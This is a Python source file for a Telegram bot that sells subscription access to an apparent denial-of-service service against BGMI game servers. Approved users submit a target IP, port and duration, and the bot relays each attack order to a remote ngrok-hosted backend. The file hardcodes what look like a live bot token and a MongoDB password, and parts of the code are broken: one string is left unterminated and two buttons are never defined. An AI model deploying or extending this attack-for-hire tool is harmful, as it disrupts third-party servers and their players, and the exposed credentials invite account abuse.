import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
loop = asyncio.get_event_loop()

TOKEN = '7816588757:AAG3A9dspCnfrzdUNx-RYFAgtn17Pe2jJcw'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -2020635020
CHANNEL_ID = -2020635020
error_channel_id = -2020635020

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['Rolex']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
current_file = "rolexvipcheatadmin.txt"
def read_ngrok_url():
    try:
        with open(current_file, "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        logging.error(f"{current_file} file not found.")
        return None
def update_ngrok_url(new_url):
    with open(current_file, "w") as file:
        file.write(new_url)
    logging.info(f"Updated ngrok URL in {current_file} to: {new_url}")
def switch_ngrok_file():
    global current_file
    if current_file == "rolexvipcheatadmin1.txt":
        current_file = "
        "
    else:
        current_file = "rolexvipcheatadmin1.txt"
    logging.info(f"Switched to {current_file}")
async def run_attack_command_async(target_ip, target_port, duration):
    ngrok_url = read_ngrok_url()
    if not ngrok_url:
        logging.error("Ngrok URL not found.")
        return

    url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
    headers = {
        "ngrok-skip-browser-warning": "any_value"
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            logging.info(f"Attack command sent successfully: {url}")
            logging.info(f"Response: {response.json()}")
        else:
            logging.error(f"Failed to send attack command. Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
    except Exception as e:
        logging.error(f"Failed to execute command: {e}")

    switch_ngrok_file()
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)
def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()
    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    if action == '/approve':
        if plan == 1:
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
    
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")


def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    btn1 = KeyboardButton("𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹")
    btn2 = KeyboardButton("𝗕𝗮𝗰𝗸𝘂𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹")
    btn3 = KeyboardButton("𝗣𝗿𝗼𝗼𝗳 𝗖𝗵𝗮𝗻𝗻𝗲𝗹")
    btn4 = KeyboardButton("𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹":
        bot.reply_to(message, "*Main Channel - https://t.me/+XgN0VtkhM1ZiOGI1*", parse_mode='Markdown')
    elif message.text == "𝗕𝗮𝗰𝗸𝘂𝗽 𝗖𝗵𝗮𝗻𝗻𝗲𝗹":
        bot.reply_to(message, "*Channel - @RIGELACCOUNTSTORE*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "𝗣𝗿𝗼𝗼𝗳 𝗖𝗵𝗮𝗻𝗻𝗲𝗹":
        bot.send_message(message.chat.id, "*Proofs Channel - @RIGELACCOUNTPROOFS*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
    elif message.text == "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻":
        bot.reply_to(message, "*DM - @RIGELBRO*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)